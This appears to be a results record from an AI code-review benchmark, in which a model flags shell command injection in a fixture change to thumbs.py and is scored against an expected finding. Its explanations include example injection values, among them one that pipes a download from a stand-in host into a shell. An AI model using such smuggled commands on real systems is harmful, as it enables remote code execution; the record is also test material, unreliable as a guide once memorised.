@@ -1,0 +1,92 @@
+{
+  "case": "C005",
+  "pr": "C005",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "ef19c30e9434",
+  "turns": 3,
+  "tool_calls": null,
+  "seconds": 46.5,
+  "setup_seconds": 0.0,
+  "total_seconds": 46.6,
+  "usage": {
+    "in": 30613,
+    "cache_read": 57600,
+    "cache_write": 0,
+    "out": 2160,
+    "source": "cli"
+  },
+  "cost_usd": 0.091466,
+  "changed_files": [
+    "thumbs.py"
+  ],
+  "findings": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity": "critical",
+      "body": "`subprocess.run(..., shell=True)` with an unquoted f-string interpolates `upload_dir`, `name`, and `oid` into a shell command. A value such as `name=\"x; id > /tmp/pwned\"` (or metacharacters in `upload_dir` / `oid`) runs arbitrary commands as the process user.\n\nImageMagick policy delegates are enforced by the `convert` binary under exec form; they do not require `shell=True`. Restore the argv-list invocation (and keep the absolute binary path unless you have a documented reason to change it):\n\n```suggestion\n    subprocess.run(\n        [\"/usr/bin/convert\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"],\n        check=True,\n    )\n```\n\nIf a shell wrapper is truly unavoidable, pass a fixed command string and feed paths as separate, `shlex.quote`-d arguments \u2014 never raw f-string concatenation."
+    },
+    {
+      "path": "thumbs.py",
+      "line": 4,
+      "severity": "warning",
+      "body": "The new comment claims shell form is required for the ImageMagick policy delegate. That is incorrect: delegates/policy are applied by the binary regardless of how it is spawned. Replacing the previous note (`name validated upstream by ALLOWED_FILES regex`) also erases the only documented assumption about input safety at this call site.\n\nRestore an accurate comment (exec form + any real upstream validation), or document which parameters are trusted and who enforces that."
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces shell command injection by switching a safe argv-list `subprocess.run` to `shell=True` with unquoted interpolation of `upload_dir`, `name`, and `oid`.\n\n## Narrative\n\n`make_thumb` previously invoked ImageMagick via an argument vector (`[\"/usr/bin/convert\", src, dst]`), which does not invoke a shell and therefore cannot interpret metacharacters in paths. The new code builds a single shell string:\n\n```python\nf\"convert {upload_dir}/{name} /srv/thumbs/{oid}.png\"\n```\n\nAny value containing spaces, `;`, `|`, `$()`, backticks, or similar is interpreted by the shell. A crafted `name` such as `x; curl evil.test | sh` (or a hostile `upload_dir` / `oid`) executes arbitrary commands as the worker user. Removing the prior note that `name` was validated upstream also drops the only documented guardrail from this call site; even with a filename regex, `upload_dir` and `oid` remain interpolated unsafely.\n\nThe rationale in the new comment (\"shell form needed for the imagemagick policy delegate\") does not hold: ImageMagick policy/delegate configuration is read by the `convert` binary itself under exec form. Policy XML does not require `shell=True`. If PATH lookup or a wrapper is the real need, keep the argv list and point at the desired binary explicitly (as the old `/usr/bin/convert` did).\n\n## Additional notes\n\n- Dropping the absolute path `/usr/bin/convert` in favor of bare `convert` under `shell=True` also widens PATH-based binary substitution risk.\n- No other files or tests exist in this repository to constrain callers.\n\n**Recommendation:** request-changes",
+  "verification": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "Head changed a safe argv-list `subprocess.run` into `shell=True` with an unquoted f-string of `upload_dir`, `name`, and `oid`, enabling classic shell metacharacter injection. Base used `/usr/bin/convert` with separate args and no shell; nothing in-repo validates those values."
+    },
+    {
+      "path": "thumbs.py",
+      "line": 4,
+      "severity_claimed": "warning",
+      "status": "skipped",
+      "reason": "not sampled"
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 9.862,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 1,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 2806,
+      "out": 442
+    },
+    "cost_usd": 0.00916
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C005-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
